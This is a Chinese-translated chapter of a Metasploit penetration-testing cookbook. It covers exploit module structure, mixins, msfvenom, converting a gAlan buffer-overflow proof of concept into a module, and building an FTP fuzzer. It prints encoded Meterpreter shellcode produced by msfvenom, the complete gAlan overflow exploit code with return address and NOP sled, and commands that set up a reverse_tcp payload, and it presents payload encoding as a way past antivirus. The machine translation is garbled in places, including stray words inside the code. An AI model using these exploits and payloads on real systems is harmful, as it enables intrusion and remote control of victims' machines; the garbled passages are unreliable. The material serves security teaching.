# 第 8 章：利用漏洞进行工作

在本章中，我们将介绍：

*   开发模块结构
*   常见漏洞混合
*   使用 msfvenom
*   将利用漏洞转换为 Metasploit 模块
*   移植和测试新的漏洞模块
*   用 Metasploit 起毛
*   编写一个简单的 FileZilla FTP fuzzer

# 导言

让我们从正式介绍漏洞利用开始本章。**漏洞**可以是一个软件、一块数据或一系列命令，利用另一个软件中的漏洞或漏洞执行用户预期的指令。这些用户预期的说明可能会导致易受攻击的软件出现异常行为。漏洞利用在渗透测试中起着至关重要的作用，因为它可以方便地进入目标系统。

到目前为止，我们已经广泛使用漏洞攻击的力量来执行渗透测试。这里需要注意的一点是，我们不能直接使用任何独立的概念证明或将代码利用到 Metasploit 框架中。我们必须将其转换为一个框架可理解的模块。该过程类似于辅助模块的开发，但有一些附加领域。本章将介绍在框架内使用漏洞时需要了解的每个细节。我们将不涉及那些与开发利用相关的方面，因为这是一个单独的研究领域。在这里，我们将使用可用的漏洞利用概念证明，并了解如何将其添加到框架中。我们还将了解一些重要的 mixin，它们可以简化将利用漏洞转化为 Metasploit 模块的过程。最后，我们将介绍一些关于模糊化模块的方法。因此，让我们继续研究配方。

# 开发模块结构

理解漏洞利用模块结构非常重要，因为它将帮助我们正确分析不同的漏洞利用模块。由于 Metasploit 框架是一个开源项目，其开发依赖于社区的贡献。来自世界各地的开发人员将各种利用的概念证明转换为 Metasploit 模块，以便每个人都可以使用它。因此，您还可以通过将新发现的漏洞转化为模块来为社区做出贡献。此外，在某些情况下，您可能需要一个不在框架中的特定漏洞。有关利用模块结构的知识将帮助您轻松地将利用转化为模块。

## 准备好了吗

让我们从了解框架内漏洞利用的模块化结构开始。它类似于具有某些特定字段的辅助结构。您可以在 `/pentest/exploits/framework3`目录中找到漏洞模块。让我们分析一下 MSF 中的漏洞结构。

## 怎么做。。。

如前所述，漏洞利用模块的格式类似于辅助模块，但有一些特定的补充：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::EXE

```

该模块首先将 MSF 核心库包括在脚本中，并声明一个类，该类扩展了与利用漏洞相关的属性。在本例中， `Metasploit3`类扩展了 `Remote Exploit`库。此外，该脚本还包括其他库，如 TCP：

```
def initialize(info = {})
super(update_info(info,
'Name' => '',
'Description')

```

然后，我们有 `initialize`函数，用于初始化模块的不同值和内容定义。此函数的一些主要定义包括 `Name, Description, Author, Version`等：

```
register_options(
[
Opt::RPORT(7777),
], self.class)
end

```

然后，我们有脚本的注册选项部分，它负责提供脚本的基本值和默认值。这些值也可以根据用户的需要进行更改。到目前为止，它与辅助模块非常相似。区别在于定义了 `exploit()`函数：

```
def exploit
connect()
sock.put(payload.encoded)
handler()
disconnect()
end

```

这是包含外壳代码或漏洞利用模式的模块的主要漏洞利用主体。此功能的内容因漏洞而异。函数体中列出了远程攻击中可能存在的一些关键功能。 `connect()`用于打开与目标的远程连接。它是在 `Remote::TCP`库中定义的函数。有效负载也是漏洞主体的重要部分，有助于建立后端连接。我们还可以根据需要在漏洞主体中定义处理程序。

或者，您还可以声明一个漏洞测试函数 `check()`，用于验证目标是否有漏洞。它验证除有效负载之外的所有选项。

这是对利用 Metasploit 模块的基本介绍。在后面的菜谱中，我们将讨论与框架中的漏洞利用相关的一些核心概念。

## 它是如何工作的。。。

我们刚才分析的利用模块结构是 Metasploit 使事情变得易懂的方式。考虑函数 T0。本部分帮助模块获取常见的漏洞利用定义。类似地，Metasploit 使用 `register_options()`拾取不同的参数或将默认参数值分配给漏洞模块。这就是模块化架构变得方便的地方。在本章后面，我们将看到如何将现有的利用漏洞代码转换为 Metasploit 模块。

# 常见漏洞混搭

mixin 是 Ruby 语言中的一种综合机制，用于将功能包含到模块中。mixin 提供了一种在单一继承语言（如 Ruby）中实现多重继承的方法。在利用模块中使用 mixin 可以帮助调用利用所需的不同函数。在这个配方中，我们将了解一些重要的 Metasploit 利用混合。

## 怎么做。。。

让我们快速查看一些常见的漏洞混合。然后，我们将在现有的利用模块中看到它的实现。

*   `Exploit::Remote::TCP:`此 mixin 为模块提供 TCP 功能。它可用于设置 TCP 连接。 `connect()`和 `disconnect()`功能分别负责建立和终止连接。需要不同的参数，如 `RHOST, RPORT, SSL`。
*   `Exploit::Remote::UDP:`此 mixin 用于模块中的 UDP 功能。UDP 通常被视为 TCP 上更快的连接模式，因此在处理模块时，它也是一个方便的选项。此 mixin 还包括 `Rex::Socket::UDP`，它消除了担心设置与目标的套接字连接的开销。
*   `Exploit::Remote::DCERPC:`此 mixin 提供与远程机器上的 DCE/RPC 服务交互的实用方法。此 mixin 的方法在开发环境中通常很有用。此 mixin 扩展了 TCP mixin。 `dcerpc_call(), dcerpc_bind()`等是 DCE/RPC mixin 的一些有用功能。
*   `Exploit::Remote::SMB:`此 mixin 定义了有助于与远程目标上的 SMB 服务通信的功能。 `smb_login(), smb_create(),and`在这个 mixin 中有一些有用的函数。
*   `Exploit::BruteTargets:`这是一个有趣的混血儿，用来暴力攻击目标。它使用 `exploit_target(target)`功能接收远程目标 IP 并执行暴力。此 mixin 可以在不同的暴力攻击中轻松扩展。
*   `Exploit::Remote::Ftp:`此 mixin 可用于利用远程目标上的 FTP 服务进行攻击。mixin 包括 `Remote::TCP`以建立与远程目标的连接。它使用 `connect()`功能接收 `RHOST`和 `RPORT`的值，以便与远程系统上的 FTP 服务器连接。
*   `Exploit::Remote::MSSQL:`此 mixin 有助于查询远程数据库。 `Mssql_ping()`函数查询数据库可用性，并将 ping 响应存储为散列。 `Mssql_xpcmdshell()`功能用于使用 `xp_cmdshell`执行系统命令。当处理与 MS SQL 相关的漏洞时，此 mixin 非常方便。
*   `Exploit::Capture:`此混入有助于嗅探网络中流动的数据包。 `open_pcap()`功能用于设置一个用于捕获流经它的数据包的设备。此 mixin 需要在机器上安装 pcap。该 mixin 的两个重要功能包括 `inject(pkt="", pcap=self.capture)`和 `inject_reply()`。前者负责将数据包注入网络设备，而后者负责根据注入的数据包报告设备返回的结果数据包。

这些是一些重要的漏洞混合，在框架内使用漏洞模块时非常方便。使用 mixin 可以减少重复记录相同模块的开销。这就是模块化体系结构非常灵活的原因，因为它有助于代码重用。

## 它是如何工作的。。。

如前所述，mixin 用于在单一继承语言（如 Ruby）中提供多重继承。我们的意思是，我们可以根据需要在任何模块中调用不同的功能。例如，如果我们希望在利用模块中建立 TCP 连接，则不需要为其定义完整的函数。我们可以在模块中简单地调用 mixin， `Exploit::Remote::TCP`，并利用其功能。

## 还有更多。。。

让我们列出一些更重要的混合物。

### 再来点调味品

除了前面提到的 mixin 之外，框架中还有许多更重要的 mixin。这些包括 `fileformat, imap, java, smtp, she`等。你可以在 `lib/msf/core/exploit`找到这些混合物。

# 与 msfvenom 合作

我们已经在[第 4 章](04.html "Chapter 4. Client-side Exploitation and Antivirus Bypass")中阅读了 `mefencode`和 `msfpayload`*客户端攻击和防病毒旁路*。让我们简单回顾一下。 `msfpayload`用于从有效负载生成二进制，而 `msfencode`用于使用不同的编码技术对二进制进行编码。这里我们将讨论另一个 Metasploit 工具，它是两者的组合。该工具可以在生成可秘密执行的漏洞利用中发挥重要作用。

## 准备好了吗

要使用 `msfvenom`开始我们的实验，启动终端窗口并传递 `msfvenom -h`命令。

## 怎么做。。。

让我们看看各种可用选项：

```
root@bt:~# msfvenom -h
Usage: /opt/framework/msf3/msfvenom [options]
Options:
-p, --payload [payload] Payload to use. Specify a '-' or stdin to use custom..
-l, --list [module_type] List a module type example: payloads, encoders, nops, all
-n, --nopsled [length] Prepend a nopsled of [length] size on to the payload
-f, --format [format] Format to output results in: raw, ruby, rb, perl, pl, bash..
-e, --encoder [encoder] The encoder to use
-a, --arch [architecture] The architecture to use
-s, --space [length] The maximum size of the resulting payload
-b, --bad-chars [list] The list of characters to avoid example: '\x00\xff'
-i, --iterations [count] The number of times to encode the payload
-c, --add-code [path] Specify an additional win32 shellcode file to include
-x, --template [path] Specify a custom executable file to use as a template
-k, --keep Preserve the template behavior and inject the payload as..
-h, --help Show this message 

```

有一些有趣的参数可以查看。 `-n`参数创建有效负载大小的 NOP 底座。另一个有趣的参数是 `-b`，它使我们能够避免使用 `\x00`等漏洞的常见特征。这对规避防病毒程序非常有帮助。其余参数与我们在 `msfpayload`和 `msfencode`中找到的参数类似。

### 注

NOP slide、NOP sled 或 NOP ramp 是一系列 NOP（无操作）指令，用于将 CPU 的指令执行流“滑动”到其最终目标。

## 它是如何工作的。。。

要使用 `msfvenom`，我们必须传递一个有效负载和一个编码样式。让我们在终端窗口上执行此任务：

```
root@bt:~# msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3
[*] x86/shikata_ga_nai succeeded with size 325 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 352 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 379 (iteration=3)
buf =
"\xdb\xdb\xbe\x0a\x3a\xfc\x6d\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x52\x31\x72\x18\x83\xea\xfc\x03\x72\x1e\xd8\x09\xb6" +
"\xce\xc5\x86\x6d\x1a\xa8\xd8\x88\xa8\xbc\x51\x64\xe5\xf2" +
"\xd1\xb7\x80\xed\x66\x72\x6e\x0d\x1c\x68\x6a\xae\xcd\x0e" +
"\x33\x90\x1d\x73\x82\xd8\xd7\xe0\x87\x76\xbd\x25\xf4\x23" +
"\x4d\x38\xc2\xc3\xe9\xa1\x7e\x31\xc5\xe4\x84\x2a\x3b\x37" +
"\xb3\xd6\x13\xc4\x09\x89\xd0\x95\x21\x10\x6b\x83\x94\x3d" + 
```

请注意随有效负载一起传递的不同参数。 `-b`参数的存在将避免在 shell 代码中使用 `\x00`（空字节）。我们可以在我们的攻击程序中使用这个外壳代码。

`msfvenom`是一个非常方便的工具，可以使用框架中可用的不同有效负载快速生成 shell 代码。这些外壳代码可以在攻击代码中实现，以便在漏洞被攻击后提供与攻击者的反向连接。

# 将漏洞转化为 Metasploit 模块

到目前为止，我们已经使用漏洞模块来破坏我们的目标。在本食谱中，我们将把模块使用体验提升到一个新的水平。我们将尝试使用可用的概念证明开发一个完整的利用模块。为了将任何新的漏洞转化为框架模块并执行渗透测试，而不必等待 Metasploit 团队的更新，将漏洞转化为模块的知识至关重要。此外，不可能每个漏洞都以框架内模块的形式提供。因此，让我们继续讨论这个配方，看看如何使用可用的 PoC 构建我们自己的漏洞模块。

## 准备好了吗

首先，让我们选择任何可以转换为模块的漏洞。让我们考虑 Galon 零日开发，可以从 Apple T0 下载。http://www.exploit-db.com/exploits/10339 。

**gAlan**是一款适用于 X Windows 和 Win32 的音频处理工具（在线和离线）。它允许您通过将代表原始音频处理组件的图标链接在一起，以模块化的方式构建合成器、效果链、混音器、音序器、鼓机等。

只有当受害者正在使用此应用程序并且攻击者事先知道这一点时，才能利用 gAlan 进行攻击。因此，攻击者必须知道受害者机器上安装了哪些应用程序。

## 怎么做。。。

在开始利用漏洞转换之前，必须了解一些有关堆栈溢出攻击的知识。

在软件中，当调用堆栈上使用过多内存时，会发生堆栈溢出。调用堆栈是包含有限内存的软件运行时堆栈，通常在程序开始时确定。调用堆栈的大小取决于许多因素，包括编程语言、机器体系结构、多线程和可用内存量。当程序试图使用比调用堆栈上可用空间更多的空间时，堆栈被称为溢出，通常导致程序崩溃。本质上， `ESP, EIP`和 `EAX`是在利用漏洞期间受到攻击最多的寄存器。

*   `ESP:`指向堆栈顶部
*   `EIP:`指向下一条指令的位置
*   `EAX:`要执行的指令

由于在堆栈中，所有寄存器都是线性存储的，因此我们需要知道 `EIP`寄存器的确切缓冲区大小，以便溢出它将为我们提供 `EAX`和后续有效负载的执行。

一旦我们有了利用的概念证明，下一步将是收集尽可能多的关于利用的信息。让我们好好看看概念证明。前几行由存储在 `$shellcode`变量中的外壳代码组成。这可以通过使用 `msfpayload`或 `msfvenom:`使用框架中可用的任何有效载荷生成

```
$magic = "Mjik";
$addr = 0x7E429353; # JMP ESP @ user32,dll
$filename = "bof.galan";
$retaddr = pack('l', $addr);
$payload = $magic . $retaddr x 258 . "\x90" x 256 . $shellcode;

```

主要漏洞代码以包含四字节字符串的 `$magic`开头。然后，我们有一个 `$addr`变量，它包含 `ESP`堆栈指针的位置。然后我们有一个包含文件名的 `$filename`变量，该文件名将作为开发后阶段创建。 `$retaddr`包含堆栈指针将指向并导致溢出后执行利用漏洞代码的返回地址的位置。最后，我们有了有效负载的执行，它负责开发和外壳代码的执行。

从这次攻击中我们知道我们的外壳代码最多可以达到 700 字节。此外，我们的有效负载的总长度是 1214 字节。这些信息将有助于构建我们的模块。

我们可以使用重复的返回地址，也可以在 `EIP`被覆盖时找到大小。Metasploit 有一个名为 `pattern_create.rb`的优秀工具，可以帮助找到 `EIP`被覆盖的确切位置。该工具生成一系列独特的模式，这些模式可以通过使用调试器传递给漏洞攻击代码；我们可以找到 `EIP`中存储的字符串模式。让我们创建一个 5000 个字符的字符串：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb
Usage: pattern_create.rb length [set a] [set b] [set c]
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000 
```

现在，编辑利用脚本，用另一个测试变量 `$junk`替换 `$payload`，并复制该变量中 5000 个字符的字符串。现在，用这个脚本测试应用程序，并检查哪个模式存储在 `EIP`中。我假设您了解反转和调试应用程序的基础知识。假设 `EIP`中存储的字符串模式为“234abc”。现在我们将使用另一个名为 `pattern_offset.rb`的 Metasploit 工具来计算该模式在我们传递的字符串中的位置：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x234abc 5000
1032 
```

因此，为了获得 `EIP`的确切位置而要传递的字节总数是 1032。

现在，我们已经收集了有关该漏洞的足够信息，并准备将其转换为 Metasploit 模块。

## 它是如何工作的。。。

让我们开始构建模块。脚本的第一行也是最重要的一行是导入库和创建父类。然后，我们将定义 `initialize()`函数，该函数将包含有关利用漏洞的信息，并注册选项：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
include Msf::Exploit::FILEFORMAT
def initialize(info = {})
super(update_info(info,
'Name' => 'gAlan 0.2.1 Buffer Overflow Exploit',
'Description' => %q{
This module exploits a stack overflow in gAlan 0.2.1
By creating a specially crafted galan file, an attacker may be able
to execute arbitrary code.
},
'License' => MSF_LICENSE,
'Author' => [ 'original by Jeremy Brown' ],
'Version' => '$Revision: 7724 $',
'References' =>
[
[ 'URL', 'http://www.exploit-db.com/exploits/10339' ],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 1000,
'BadChars' => "\x00\x0a\x0d\x20\x0c\x0b\x09",
'StackAdjustment' => -3500,
Metasploit moduleworking},
'Platform' => 'win',
'Targets' =>
[
[ 'Windows XP Universal', { 'Ret' => 0x100175D0} ], # 0x100175D0 call esi @ glib-1_3
],
'Privileged' => false,
'DefaultTarget' => 0))
register_options(
[
OptString.new('FILENAME', [ false, 'The file name.', 'evil.galan']),
], self.class)
end

```

到目前为止，它是简单而直接的。twist 从定义 `exploit()`函数开始。让我们看看如何做到这一点。

我们将从原始攻击脚本的前四个字节开始，即 `$magic = "Mjik"`；

在我们的模块中将其替换为 `sploit = "Mjik"`。

然后，我们继续前进，建立我们的缓冲区。由于我们发现 `EIP`被覆盖的位置，我们可以通过以下方式替换重复的返回地址值：

```
sploit << rand_text_alpha_upper(1028);
sploit << [target.ret].pack('V');

```

然后，我们必须添加 nop 幻灯片。因此，部分利用脚本将更改为模块中的以下行：

```
sploit << "\x90" * 45

```

最后，我们构建完整的外壳代码：

```
sploit << payload.encoded

```

最后，我们可以在 `exploit()`函数下组合这些脚本行。

```
def exploit
sploit = "Mjik"
sploit << rand_text_alpha_upper(1028)
sploit << [target.ret].pack('V')
sploit << "\x90" * 45
sploit << payload.encoded
galan = sploit
print_status("Creating '#{datastore['FILENAME']}' file ...")
file_create(galan)
end 
```

这是一个简短的演示，演示了如何将现有的漏洞转化为 Metasploit 模块。此过程的难度因漏洞而异。了解更多信息的最佳方法是查看 Metasploit 库中可用的漏洞利用模块。在下一个配方中，我们将学习如何将此漏洞利用模块移植到框架中，以便我们可以使用它进行渗透测试。

# 移植并测试新的漏洞模块

在前面的配方中，我们了解了如何使用可用的概念证明为 Metasploit 开发一个完整的漏洞利用模块。在这个配方中，我们将把模块保存在一个适当的位置，然后测试它，看看是否一切正常。

## 准备好了吗

这是非常重要的照顾文件夹，我们要存储我们的漏洞模块。这可以帮助您跟踪不同的模块，也有助于框架理解基本的模块用法。现在您已经有了完整的模块脚本，让我们找到一个适当的位置来保存它。

## 怎么做。。。

由于这是一个攻击模块，目标是影响特定文件格式的 Windows 操作系统，因此我们必须相应地选择模块位置。查看 `modules/exploits/windows`目录，您可以找到 `fileformat`漏洞模块的特定文件夹。这是我们可以保存模块的位置。让我们将其另存为 `galan_fileformat_bof.rb`。

## 它是如何工作的。。。

下一个也是最后一个任务是检查我们的模块是否正常工作。到目前为止，我们已经在模块方面做了很多工作，所以这一步很容易。我们将遵循迄今为止使用的相同流程：

```
msf > use exploit/windows/fileformat/galan_fileformat_bof
msf exploit(galan_fileformat_bof) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(galan_fileformat_bof) > set LHOST 192.168.56.101
msf exploit(galan_fileformat_bof) > exploit 
```

一旦传递了利用漏洞命令，模块将执行并创建一个文件，该文件可用于在目标计算机上造成溢出。

这就完成了我们的模块创建和执行过程。您可能已经看到，这个过程非常简单。真正的工作在于正确地将利用脚本转换为框架模块。您可以根据需要调试或修改任何现有模块。您还可以向 Metasploit 社区提交任何新创建的模块，以帮助其他人从中受益。

# 使用 Metasploit 进行起毛

模糊测试或模糊化是一种软件测试技术，它包括使用随机数据注入查找实现缺陷。模糊脚本生成格式错误的数据并将其传递给特定的目标实体，以验证其溢出容量。Metasploit 提供了几个模糊模块，这些模块有助于开发漏洞。让我们进一步探讨模糊化的基础知识，以及如何将 Metasploit 模块用作潜在的模糊器。

## 准备好了吗

在我们跳转到 Metasploit fuzzer 模块之前，让我们简要概述一下 fuzzing 及其类型。

模糊处理被视为一种黑盒测试技术，我们在其中测试软件的最大溢出容量。Fuzzing 被积极地用于发现应用程序中的 bug。

Fuzzer 可用于测试软件、协议和文件格式。Fuzzers 使数据生成和注入过程自动化。我们可以控制要注入的数据或数据包的大小。

fuzzer 会尝试对以下对象进行组合攻击：

*   数字（有符号/无符号整数、浮点等）
*   字符（URL 和命令行输入）
*   元数据：用户输入文本（ `id3`标签）
*   纯二进制序列

根据我们针对的应用程序或协议的类型，我们可以设置 fuzzer 来生成数据/数据包以测试其溢出。Metasploit 包含几个 fuzzer 模块，可用于针对黑盒测试测试应用程序和协议。这些模块可位于 `modules/auxiliary/fuzzers`处。让我们分析一下这些模块的实现。

## 怎么做。。。

让我们用一个基于协议的模糊器模块进行实验。Metasploit 有一个名为 `client_ftp.rb`的 FTP 模块，它充当 FTP 服务器并向 FTP 客户端发送响应：

```
msf > use auxiliary/fuzzers/ftp/client_ftp
msf auxiliary(client_ftp) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
CYCLIC true yes Use Cyclic pattern instead..
ENDSIZE 200000 yes Max Fuzzing string size.
ERROR false yes Reply with error codes only
EXTRALINE true yes Add extra CRLF's in..
FUZZCMDS LIST.. yes Comma separated list..
RESET true yes Reset fuzzing values after..
SRVHOST 0.0.0.0 yes The local host to listen on.
SRVPORT 21 yes The local port to listen on.
SSL false no Negotiate SSL for incoming..
SSLVersion SSL3 no Specify the version of SSL..
STARTSIZE 1000 yes Fuzzing string startsize.
STEPSIZE 1000 yes Increment fuzzing string.. 
```

您可以看到，我们可以使用许多有趣的参数。让我们了解每个参数具有哪些功能。

*   `CYCLIC`选项用于将循环模式设置为模糊数据。这样做是为了确定偏移量，因为字符串的每四个字节都是唯一的。如果设置为 false，则模糊程序将使用字符串 a 作为模糊数据。
*   `ENDSIZE`选项定义发送回 FTP 客户端的模糊数据的最大长度。默认情况下，它设置为 20000 字节。
*   `ERROR`选项如果设置为 true，将使用错误代码回复 FTP 客户端。
*   `EXTRALINE`选项是目录列表的模糊测试。如果向客户端发送非常大的目录名请求，某些 FTP 客户端可能会崩溃。
*   `FUZZCMDS`选项允许我们定义需要模糊化的响应。可能的请求是 `LIST, NLST, LS, RETR`。我们还可以设置 `*`模糊所有命令。
*   `SRVHOST`选项是 fuzzer 将与 FTP 服务器绑定的 IP 地址。对于本地机器，我们可以使用 `0.0.0.0`。
*   `SRVPORT`选项是 FTP 服务器端口，默认为 21。
*   `STARTSIZE`选项用于定义模糊数据的初始数据长度。
*   `STEPSIZE`选项用于定义每次溢出失败时的增量。

使用模糊器时应小心。如果没有传递正确的参数值，那么模糊测试可能会失败。您可以随时参考模块源代码来深入理解 fuzzer。让我们运行 FTP 客户端模糊程序，看看返回了什么输出：

```
msf auxiliary(client_ftp) > run
[*] Server started.
[*] Client connected : 192.168.56.102
[*] - Set up active data port 20
[*] Sending response for 'WELCOME' command, arg
[*] Sending response for 'USER' command, arg test
[*] Sending response for 'PASS' command, arg test
[*] - Set up active data port 16011
[*] Sending response for 'PORT' command, arg 192,168,0,188,62,139
[*] Handling NLST command
[*] - Establishing active data connection
[*] - Data connection set up
[*] * Fuzzing response for LIST, payload length 1000
[*] (i) Setting next payload size to 2000
[*] - Sending directory list via data connection 
```

输出有几点需要注意。首先，FTP 服务器在攻击机器上启动。然后，它连接回 FTP 客户端。然后，它开始向客户机发送不同的响应命令。模糊化过程从 `NLST`命令开始。然后，它进入列表，依此类推。

这是 fuzzer 模块如何工作的一个小演示。在下一个配方中，我们将通过构建我们自己的模糊模块来更深入地研究协议模糊。

## 它是如何工作的。。。

模糊程序根据我们想要模糊的应用程序创建不同的测试用例。在我们的示例中，FTP 服务器可以通过发送随机数据包，然后分析其响应来进行模糊化。数据包可以通过网络模糊以下属性：

*   **数据包报头：**模糊器可以在报头中插入任意长度和值的随机数据包，并分析其响应。
*   **数据包校验和：**校验和值也可以在特定条件下使用模糊器进行操作。
*   **数据包大小：**也可以将任意长度的数据包发送到网络应用程序，以确定崩溃。

一旦报告了崩溃或溢出，fuzzer 可以返回其测试用例以提供溢出数据。

# 编写一个简单的 FileZilla FTP fuzzer

我们在前面的配方中分析了 fuzzer 模块的工作。让我们通过构建我们自己的小型 FTP fuzzer 向前迈进一步，该 fuzzer 可用于对付 FileZilla FTP 服务器。

## 怎么做。。。

构建 fuzzer 的基本模板与我们在开发辅助模块时讨论的模板类似。因此，我们的基本模板应如下所示：

```
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
include Msf::Auxiliary::Scanner
def initialize
super(
'Name' => 'FileZilla Fuzzer',
'Version' => '$Revision: 1 $',
'Description' => 'Filezilla FTP fuzzer',
'Author' => 'Abhinav_singh',
'License' => MSF_LICENSE
)
register_options( [
Opt::RPORT(14147),
OptInt.new('STEPSIZE', [ false, "Increase string size each iteration with this number of chars",10]),
OptInt.new('DELAY', [ false, "Delay between connections",0.5]),
OptInt.new('STARTSIZE', [ false, "Fuzzing string startsize",10]),
OptInt.new('ENDSIZE', [ false, "Fuzzing string endsize",20000])
], self.class)
end

```

因此，我们导入了 MSF 库，创建了一个类，并定义了我们的选项。下一步是定义 fuzzer 的主体。

```
def run_host(ip)
udp_sock = Rex::Socket::Udp.create(
'Context' =>
{
'Msf' => framework,
'MsfExploit' => self,
}
)
startsize = datastore['STARTSIZE'] # fuzz data size to begin with
count = datastore['STEPSIZE'] # Set count increment
simple FileZilla FTP fuzzerwritingwhile count < 10000 # While the count is under 10000 run
evil = "A" * count # Set a number of "A"s equal to count
pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00" # Define the payload
udp_sock.sendto(pkt, ip, datastore['RPORT']) # Send the packet
print_status("Sending: #{evil}")
resp = udp_sock.get(1) # Capture the response
count += 100 # Increase count by 10, and loop
end
end
end 
```

让我们分析一下脚本。该脚本首先创建与 FileZilla 服务器建立连接所需的 UDP 套接字。然后，我们声明变量 `startsize`和 `count`，这两个变量分别保存用于启动模糊器的数据大小和增量长度的值。然后，我们建立了一个循环，在该循环下，我们声明了我们的邪恶字符串和将作为数据包（pkt）发送的有效负载格式。

然后，脚本尝试使用 `udp_sock_sendto`函数将数据包发送到服务器，并使用 `resp=udp_sock.get()`捕获其响应。此外，每当接收到响应时，分组的计数增加 100。

## 它是如何工作的。。。

要开始使用该模块，我们必须将其保存在 `modules/auxiliary/fuzzers/ftp`下。让我们将模糊器模块命名为 `filezilla_fuzzer.rb:`

```
msf > use auxiliary/fuzzers/ftp/filezilla_fuzzer
msf auxiliary(filezilla_fuzzer) > show options
Module options (auxiliary/fuzzers/ftp/filezilla_fuzzer):
Name Current Setting Required Description
---- --------------- -------- -----------
DELAY 0.5 no Delay between..
ENDSIZE 20000 no Fuzzing string endsize
RHOSTS yes The target address
RPORT 14147 yes The target port
STARTSIZE 10 no Fuzzing string startsize
STEPSIZE 10 no Increase string size.. 
```

因此，我们的模块工作正常，并向我们显示可用选项。让我们传递各自的值，看看当我们传递 `run`命令时会发生什么：

```
msf auxiliary(filezilla_fuzzer) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1
msf auxiliary(filezilla_fuzzer) > run
[*] Sending: AAAAAAAAAA
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```

答对 了 fuzzer 开始向服务器发送字符串，并继续该过程，除非服务器崩溃或循环结束。如果循环在崩溃之前结束，则可以修改脚本以发送更大的字符串长度。这是一个使用 Metasploit 对软件进行模糊化的简单演示。通常不建议使用 Metasploit 作为大型软件的模糊化平台。我们有几个专门为模糊软件和应用程序设计的框架。

## 还有更多。。。

让我们快速看一看模糊化框架，如果您想增强您的模糊化知识并利用开发，您可以使用该框架。

### 反 Parser 模糊框架

AntipParser 是一个用 python 编写的模糊化框架。它有助于创建专门用于构建模糊器的随机数据。该框架可用于开发将在多个平台上运行的模糊程序，因为该框架完全依赖于 Python 解释器的可用性。

反 Parser 可从[下载 http://sourceforge.net/projects/antiparser/](http://sourceforge.net/projects/antiparser/) 。